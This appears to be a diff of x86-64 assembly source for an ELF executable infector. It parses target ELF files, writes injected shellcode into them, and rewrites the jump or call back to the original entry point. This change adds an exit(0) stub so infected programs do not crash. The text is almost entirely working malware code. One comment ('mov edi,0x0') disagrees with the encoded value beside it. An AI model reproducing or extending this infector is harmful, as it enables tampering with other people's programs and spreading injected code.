@@ -442,8 +442,9 @@ push rdx
 	pop rdx
 	pop rcx
 retn
-%define SHELLCODE_LEN 36 ; 29 + 5 (jmp)
-%define PURE_SHELLCODE_LEN 31 
+%define SHELLCODE_LEN 51 ; 34 + 5 (jmp) + 12 (exit)
+%define SHELLCODE_JMP_INDEX 39 ; 34 + 5 (jmp)
+%define PURE_SHELLCODE_LEN 34 
 ; void parse64elf(void *file, int wfd, unsigned long fsize)
 parse64elf:
 	sub rsp, 8
@@ -1219,6 +1220,7 @@ parse64elfsec:
 	call write_shellcode
 	mov rsi, QWORD[rsp + 16]
 	call write_jmp_shellcode
+	call write_exit_shellcode; so it doesn't segv when ret is reached in original code
 	mov rsi, QWORD[rsp + 16]
 	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
 	mov rdx, r9 ; fsize
@@ -1264,11 +1266,11 @@ write_jmp_shellcode:
 	sub rsp, 4; rel_jmp
 
 	push rsi
-	push 0x000000e9
+	push 0x000000e8
 	mov rax, 1
 	mov rsi, rsp
 	mov rdx, 1
-	syscall; write(wfd, "\xe9", 1); op code of jmp
+	syscall; write(wfd, "\xe8", 1); op code of call
 	pop rax
 	pop rsi
 	mov rbx, rdi; save rdi
@@ -1281,7 +1283,7 @@ write_jmp_shellcode:
 	call find_new_entry_text
 	wjs_done: ; rax now contains new_entry
 	mov DWORD[rsp], eax
-	add DWORD[rsp], SHELLCODE_LEN
+	add DWORD[rsp], SHELLCODE_JMP_INDEX
 	mov rax, QWORD[rdi + 24]; old_entry
 	sub DWORD[rsp], eax
 	neg DWORD[rsp]
@@ -1291,5 +1293,30 @@ write_jmp_shellcode:
 	mov rdi, rbx
 	syscall; write(wfd, &jmp_addr, 4);
 	add rsp, 4
+retn
 
+write_exit_shellcode:
+	mov rax, 0x0000003cb8; mov    eax,0x3c
+	push rax
+	mov rsi, rsp
+	mov rdx, 5
+	mov rax, 1
+	syscall; write(wfd, 0xb83c000000, 5);
+	pop rax
+
+	mov rax, 0x00000013bf; mov    edi,0x0
+	push rax
+	mov rsi, rsp
+	mov rdx, 5
+	mov rax, 1
+	syscall; write(wfd, 0xbf00000000, 5);	
+	pop rax
+
+	push 0x050f ; syscall
+	mov rsi, rsp
+	mov rdx, 2
+	mov rax, 1
+	syscall; write(wfd, 0x0f05, 2);
+	pop rax
+	;all this is eq to c: exit(0);
 retn
